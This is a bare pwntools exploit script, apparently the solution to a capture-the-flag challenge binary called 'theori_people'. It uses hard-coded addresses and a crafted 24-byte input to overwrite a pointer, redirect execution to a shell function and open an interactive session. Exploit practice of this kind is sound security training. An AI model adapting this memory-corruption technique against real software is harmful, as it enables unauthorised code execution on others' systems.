from pwn import *

shellfun = 0x401139
helper = 0x603100	# helper +8 : shellfun

heap = 0x616440
printmenu = 0x000000000040123b
thirdmenu = 0x00000000004018be
member = 0x603480

if __name__ == '__main__':
        s = process('./theori_people')
	
	s.recvuntil("# ")
	s.sendline("1")
	s.recvuntil(": ")
	s.sendline("AAAAAAAA")
	s.recvuntil("# ")
	s.sendline("1")
	s.recvuntil(": ")
	s.sendline("BBBBBBBB")
	s.recvuntil("# ")
	s.sendline("2")
	s.recvuntil("> ")
	s.sendline("0")
	s.recvuntil("\n")
	s.sendline("Yes")
	s.recvuntil("?")
	s.sendline("24")
	s.sendline(p64(helper))
	s.recvuntil("# ")
	s.send("3")

	s.interactive()
        s.close()
